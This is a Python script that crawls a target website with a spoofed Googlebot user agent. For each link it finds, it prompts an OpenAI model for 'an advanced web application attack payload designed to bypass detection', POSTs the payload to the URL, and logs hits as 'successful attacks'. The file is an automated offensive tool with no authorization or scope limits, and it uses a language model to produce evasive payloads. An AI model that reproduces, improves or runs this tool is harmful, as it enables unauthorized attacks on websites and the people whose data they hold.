import os
import sys
import signal
import scrapy
from scrapy.crawler import CrawlerProcess
import requests
from openai import OpenAI

def setup_openai_client():
    """Set up OpenAI client using API key from environment."""
    api_key = os.getenv('OPENAI_API_KEY')
    if not api_key:
        sys.exit("Error: OPENAI_API_KEY environment variable not set.")
    return OpenAI(api_key=api_key)

class EndpointSpider(scrapy.Spider):
    name = 'endpoint_spider'
    custom_settings = {
        'LOG_LEVEL': 'WARNING',
        'USER_AGENT': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'REQUEST_FINGERPRINTER_IMPLEMENTATION': '2.7'
    }

    def __init__(self, url, client):
        super().__init__()
        self.client = client
        self.start_urls = [self.normalize_url(url)]

    def normalize_url(self, url):
        """Ensure URL starts with http:// or https://."""
        return url if url.startswith(('http://', 'https://')) else 'http://' + url

    def parse(self, response):
        """Process each found URL within the site."""
        for href in response.css('a::attr(href)').getall():
            full_url = response.urljoin(href)
            if not full_url.startswith('javascript'):
                yield response.follow(full_url, self.parse)
                self.fuzz_url(full_url)

    def fuzz_url(self, url):
        """Generate and send payload to the URL."""
        prompt = "Generate an advanced web application attack payload designed to bypass detection for the target."
        payload = self.generate_payload(prompt)
        if payload:
            self.send_payload(url, payload)

    def generate_payload(self, prompt):
        """Generate payloads using OpenAI's GPT model."""
        try:
            response = self.client.completions.create(
                model="gpt-3.5-turbo-instruct",
                prompt=prompt,
                max_tokens=100,
                temperature=0.5
            )
            return response.choices[0].text.strip()
        except Exception as e:
            print(f"Error in payload generation: {e}")
            return None

    def send_payload(self, url, payload):
        """Send generated payloads to the specified URL."""
        try:
            response = requests.post(url, data={"input": payload}, timeout=10)
            if response.status_code == 200:
                self.log_successful_attack(url, payload)
            else:
                print(f"Attack failed on {url}, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending payload to {url}: {e}")

    def log_successful_attack(self, url, payload):
        """Log successful attacks to a file."""
        message = f"URL: {url}, Payload: {payload}\n"
        with open("successful_attacks.txt", "a") as file:
            file.write(message)

def signal_handler(signal, frame):
    """Handle interrupt signals."""
    print('Scan stopped by user.')
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("Usage: python this_script.py <starting_url>")

    starting_url = sys.argv[1]
    client = setup_openai_client()
    process = CrawlerProcess(settings=EndpointSpider.custom_settings)
    process.crawl(EndpointSpider, url=starting_url, client=client)
    signal.signal(signal.SIGINT, signal_handler)
    process.start()
